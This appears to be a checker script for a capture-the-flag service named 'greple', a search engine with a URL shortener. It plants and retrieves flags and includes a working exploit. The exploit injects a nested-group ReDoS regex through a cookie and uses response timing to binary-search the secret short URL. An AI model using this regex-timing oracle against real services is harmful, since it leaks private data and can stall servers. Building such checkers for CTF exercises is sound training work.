"""Checker for greple service."""

import json
import math
import pathlib
import random
import re
import string
from collections.abc import Sequence
from html import escape
from urllib.parse import parse_qs, quote, unquote, urlencode

import fastapi
import httpx
from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

_CHECKER = Enochecker("greple", 7777)

with (pathlib.Path.cwd() / "words.json").open() as f:
    _WORDS: list[str] = json.load(f)

_ENTROPY = 64

_FLAG_URL_PREFIX = "http://example.com/"

_REGEX_ESCAPE = {ord(c): rf"\{c}" for c in r"^$.*?+{|()\["}

# TODO: add url prefix
_SHORT_URL_PREFIX = ""
_SHORT_URL_ALPHABET = string.digits + string.ascii_lowercase[: 16 - len(string.digits)]
_SHORT_URL_LENGTH = math.ceil(_ENTROPY / math.log2(len(_SHORT_URL_ALPHABET)))
_SHORT_URL_REGEX = (
    r"\b"
    f"{_SHORT_URL_PREFIX.translate(_REGEX_ESCAPE)}"
    f"[{_SHORT_URL_ALPHABET.translate(_REGEX_ESCAPE)}]"
    f"{{{_SHORT_URL_LENGTH}}}"
    r"\b"
)


def _cookieencode(query: dict[str, str]) -> str:
    return urlencode(query, quote_via=quote)


def _noise(entropy: int, alphabet: Sequence[str], sep: str) -> str:
    n = math.ceil(entropy / math.log2(len(alphabet)))
    return sep.join(random.choice(alphabet) for _ in range(n))


def _alnum(entropy: int = _ENTROPY) -> str:
    return _noise(entropy, string.ascii_letters + string.digits, "")


def _words(entropy: int = _ENTROPY) -> str:
    return _noise(entropy, _WORDS, " ")


def _assert_re(regex: str, text: str) -> re.Match[str]:
    m = re.search(regex, text)
    if not m:
        raise MumbleException(f"Regex {regex!r} not found in {text!r}")
    return m


async def _register(client: httpx.AsyncClient, user: str) -> str:
    res = await client.get("/preferences")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/preferences",
        data={"user": user, "password": _alnum(), "form_user_account": "Login"},
    )
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    if res.next_request is None:
        raise MumbleException("No redirect")
    assert_in("user_account", res.cookies, "No user_account cookie")
    cookie = parse_qs(res.cookies["user_account"])
    assert_in("user", cookie, "No user cookie")
    assert_equals(cookie["user"], [user], "Unexpected user cookie")
    assert_in("hmac", cookie, "No hmac cookie")
    assert_equals(len(cookie["hmac"]), 1, "Unexpected hmac cookie")

    res = await client.send(res.next_request)
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(f'value="{escape(user)}"', res.text, "Unexpected form value")

    return cookie["hmac"][0]


async def _submit_page(
    client: httpx.AsyncClient,
    url: str,
    title: str,
    text: str,
) -> None:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/console",
        data={"url": url, "title": title, "text": text, "form_submit_page": "Submit"},
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in("page has been submitted", res.text, "Unexpected form value")


async def _shorten_url(client: httpx.AsyncClient, url: str) -> str:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/console",
        data={"url": url, "form_shorten_url": "Shorten"},
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    short_url = re.search(_SHORT_URL_REGEX, res.text)
    if not short_url:
        raise MumbleException("Failed to find short URL")

    return short_url[0]


async def _search(client: httpx.AsyncClient, q: str) -> httpx.Response:
    res = await client.get("/")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    query = urlencode({"q": q, "btnG": "Greple Search"})
    res = await client.get(f"/search?{query}")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(f'value="{escape(q)}"', res.text, "Unexpected form value")
    # TODO: more checks
    # TODO: add checks for result number and timing output

    return res


async def _get_short_url(client: httpx.AsyncClient, short_url: str) -> str:
    # TODO: remove prefix infavor of having prefix in url
    res = await client.get(f"/u/{short_url}")
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    try:
        return res.headers["Location"]
    except KeyError as e:
        raise MumbleException("Failed to get Location header") from e


@_CHECKER.putflag(0)
async def _putflag(
    task: PutflagCheckerTaskMessage,
    client: httpx.AsyncClient,
    db: ChainDB,
) -> str:
    user = _alnum()
    hmac = await _register(client, user)

    url = await _shorten_url(client, f"{_FLAG_URL_PREFIX}{quote(task.flag)}")

    text = _words()
    await _submit_page(
        client,
        f"{_FLAG_URL_PREFIX}{quote(_alnum())}",
        _words(_ENTROPY // 2),
        text + " " + url,
    )

    await db.set("user", user)
    await db.set("hmac", hmac)
    await db.set("text", text)

    return text


@_CHECKER.getflag(0)
async def _getflag(
    task: GetflagCheckerTaskMessage,
    client: httpx.AsyncClient,
    db: ChainDB,
) -> None:
    try:
        user = await db.get("user")
        hmac = await db.get("hmac")
        text = await db.get("text")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = _cookieencode({"user": user, "hmac": hmac})

    res = await _search(client, text)
    short_url = re.search(_SHORT_URL_REGEX, res.text)
    if not short_url:
        raise MumbleException("Failed to find short URL")

    url = await _get_short_url(client, short_url[0])
    assert_in(quote(task.flag), url, "Flag missing")


async def _test_for_regex_match(client: httpx.AsyncClient, q: str, regex: str) -> bool:
    n = 2**8
    redos = "(" * n + "." + ")*" * n

    res = await client.get(
        "/search?" + urlencode({"q": q}),
        cookies={
            "safe_search": _cookieencode({"enabled": "on", "regex": redos + regex}),
        },
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    t = re.search(r"\b[0-9]\.[0-9]{2}\b", res.text)
    if not t:
        raise MumbleException("Failed to find timing output")
    return float(t[0]) < 0.1


@_CHECKER.exploit(0)
async def _exploit_sca(
    task: ExploitCheckerTaskMessage,
    client: httpx.AsyncClient,
) -> str | None:
    if task.attack_info is None:
        raise MumbleException("Missing attack info")

    short_url = _SHORT_URL_PREFIX

    for _ in range(_SHORT_URL_LENGTH):
        lo = 0
        hi = len(_SHORT_URL_ALPHABET) - 1

        while lo < hi:
            mid = (lo + hi) // 2

            if await _test_for_regex_match(
                client,
                task.attack_info,
                task.attack_info.translate(_REGEX_ESCAPE)
                + " "
                + short_url.translate(_REGEX_ESCAPE)
                + "["
                + _SHORT_URL_ALPHABET[lo : mid + 1].translate(_REGEX_ESCAPE)
                + "]",
            ):
                hi = mid
            else:
                lo = mid + 1

        short_url += _SHORT_URL_ALPHABET[lo]

    url = await _get_short_url(client, short_url)
    return unquote(url.removeprefix(_FLAG_URL_PREFIX))


def app() -> fastapi.FastAPI:
    """Return app to gunicorn."""
    return _CHECKER.app
